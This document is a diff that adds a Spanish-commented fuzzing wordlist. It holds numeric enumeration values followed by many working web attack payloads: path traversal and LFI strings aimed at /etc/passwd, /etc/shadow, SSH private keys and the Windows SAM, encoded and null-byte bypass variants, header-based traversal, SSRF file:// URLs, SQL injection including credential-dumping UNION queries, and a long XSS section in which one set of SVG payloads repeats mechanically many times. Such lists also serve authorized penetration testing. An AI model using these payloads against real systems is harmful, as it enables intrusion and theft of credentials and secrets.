@@ -1,0 +1,1154 @@
+// --- Básicos: incrementales y populares ---
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+20
+30
+50
+99
+100
+101
+102
+123
+200
+201
+250
+300
+400
+401
+403
+404
+500
+555
+666
+777
+888
+999
+1000
+1111
+1234
+1337
+2222
+2345
+3000
+3456
+4000
+4321
+4444
+4567
+5000
+5432
+5555
+5678
+6000
+6543
+6666
+6789
+7000
+7777
+7890
+8000
+8888
+9000
+9876
+9999
+10000
+11111
+12345
+22222
+23456
+30000
+34567
+40000
+45678
+50000
+54321
+56789
+60000
+65432
+70000
+76543
+80000
+87654
+90000
+98765
+99999
+
+// --- Números negativos (test lógica de permisos) ---
+-1
+-10
+-123
+-999
+-9999
+
+// --- Repeticiones útiles ---
+000
+0000
+00000
+00001
+00100
+01110
+11111
+22222
+33333
+44444
+55555
+66666
+77777
+88888
+99999
+
+// --- Palíndromos y simétricos (fallos lógicos o coincidencias) ---
+1221
+2112
+3443
+4554
+5665
+6886
+9009
+1001
+2332
+3443
+9889
+
+// --- Bypass por padding o representación ---
+0001
+0010
+0100
+099
+009
+090
+0123
+000123
+
+// --- Overflow y máximos de variables ---
+999999
+1000000
+1234567
+9999999
+2147483647  // Max int32
+2147483648  // int32 overflow
+4294967295  // Max uint32
+4294967296  // uint32 overflow
+
+// --- Hexadecimal, unicode y encoding ---
+0x0
+0x1
+0x10
+0x20
+0xFF
+0x7FFFFFFF
+0xdeadbeef
+%30%30%31        // encoded: 001
+%2e%2e%2f         // ../ traversal
+%2f..%2f          // /../
+
+// --- Números “curiosos” o comunes en CTFs ---
+100100
+101010
+110011
+121212
+123123
+13371337
+202020
+303030
+313131
+31337
+444000
+543210
+654321
+666000
+777000
+888000
+999000
+123456789
+987654321
+
+// --- Exploits indirectos y variantes combinadas ---
+1.1
+123/../456
+../../etc/passwd
+../../../admin
+123?admin=true
+456%00
+789%09
+999%2e%2e
+../1
+../2
+../9999
+
+// --- Para endpoints con tokens/hashs numéricos ---
+0000000001
+0000000010
+0000000100
+0000001000
+0000010000
+0000100000
+0001000000
+0010000000
+0100000000
+1000000000
+// ...agrega más según sea necesario...
+
+// --- Linux clásicos ---
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../etc/shadow
+../../etc/hosts
+../../etc/group
+../../boot.ini
+../../proc/self/environ
+../../.ssh/id_rsa
+../../root/.bash_history
+../../var/log/auth.log
+../../var/log/nginx/access.log
+
+// --- Windows clásicos ---
+..\\..\\boot.ini
+..\\..\\windows\\win.ini
+..\\..\\windows\\System32\\drivers\\etc\\hosts
+..\\..\\..\\windows\\repair\\sam
+..\\..\\..\\windows\\system32\\config\\system
+..\\..\\..\\windows\\system32\\config\\SAM
+..\\..\\..\\windows\\system32\\config\\RegBack\\system
+
+// --- URL encoded ---
+..%2f..%2fetc%2fpasswd
+..%2e%2e%2fetc%2fpasswd
+..%2e%2e%2f..%2e%2e%2fetc%2fpasswd
+..%2f..%2f..%2fboot.ini
+..%2e%2e/%2e%2e/%2e%2e/etc/shadow
+..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+..%2e%2e%5c..%2e%2e%5c..%2e%2e%5cconfig%5cSAM
+
+// --- Double encoding / obfuscación avanzada ---
+..%252e%252e%252fetc%252fpasswd
+..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
+..%c0%af..%c0%afetc%c0%afpasswd
+..%c1%1c..%c1%1cetc%c1%1cpasswd
+..%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+..%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/etc/passwd
+
+// --- UTF-8 / Unicode evasiones ---
+..%u2216..%u2216etc%u2216passwd
+..%uEFC8..%uEFC8etc%uEFC8passwd
+..𝄞..𝄞etc𝄞passwd
+%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd
+
+// --- Separadores raros / truncamiento ---
+..;../etc/passwd
+..%09../etc/passwd
+..%00../etc/passwd
+..%0d%0a../etc/passwd
+....//....//etc/passwd
+../////../////etc////passwd
+....//....//....//etc/shadow
+
+// --- Null byte + extensión -->
+../../etc/passwd%00.jpg
+../../etc/shadow%00.html
+../../boot.ini%00.txt
+
+// --- Técnicas de truncamiento (según backend) ---
+../../etc/passwd.
+../../etc/passwd..//
+../../etc/passwd/./
+../../etc/passwd./
+../../etc/passwd%20
+../../etc/passwd%23
+../../etc/passwd%26
+../../etc/passwd%3F
+
+// --- LFI combinado con traversal ---
+index.php?page=../../../../etc/passwd
+index.php?file=../../../../etc/shadow
+view.php?template=../../../../../windows/system.ini
+template.jsp?path=../../../../../boot.ini
+render?include=../../../../../../.ssh/id_rsa
+
+// --- Traversal en parámetros HTTP comunes ---
+GET /download?file=../../etc/passwd
+GET /?path=../../etc/shadow
+GET /?config=..\\..\\windows\\win.ini
+GET /export?target=../../../../../../../../etc/passwd
+GET /api/view?template=../../../boot.ini
+GET /static/assets?src=../../../.ssh/id_rsa
+GET /log?name=../../../../../../../../var/log/auth.log
+
+// --- Encadenamiento ../ para bypass normalización ---
+....//....//etc/passwd
+..../..../..../etc/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fshadow
+
+// --- Path traversal en headers (si backend lo usa) ---
+X-File-Path: ../../../../etc/passwd
+X-Original-URL: /../../../../etc/passwd
+X-Custom-Path: ../../boot.ini
+Forwarded: for=../../etc/shadow
+Referer: ../../../../etc/passwd
+Origin: ../../../../../windows/win.ini
+
+// --- Traversal combinado con SSRF (para fuzzing extremo) ---
+http://127.0.0.1/../../etc/passwd
+http://localhost/../../../boot.ini
+file:///etc/passwd
+file://C:/windows/system32/drivers/etc/hosts
+// ...agrega más según sea necesario...
+
+// --- Inyección SQL ---
+' OR 1=1 --
+" OR "1"="1" --
+admin' --
+' OR 'a'='a
+" OR "a"="a
+') OR ('a'='a
+' OR 1=1#
+' OR 1=1/*
+' OR 1=1 LIMIT 1;--
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT username, password FROM users --
+' AND 1=1 --
+' AND 1=2 --
+' OR sleep(5) --
+' OR benchmark(1000000,MD5(1)) --
+' OR 1=1-- -
+' OR 1=1;--
+' OR ''='
+' OR 1=1#
+' OR 1=1/*
+' OR 1=1 LIMIT 1;--
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT username, password FROM users --
+' AND 1=1 --
+' AND 1=2 --
+' OR sleep(5) --
+' OR benchmark(1000000,MD5(1)) --
+' OR 1=1-- -
+' OR 1=1;--
+' OR ''='
+// ...agrega más según sea necesario...
+
+// --- XSS (Cross-Site Scripting) ---
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<math><mi//xlink:href="data:x,<script>alert(1)</script>"></math>
+<details/open/ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror="alert(1)">
+<embed src="data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<svg><script>alert(1)</script>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
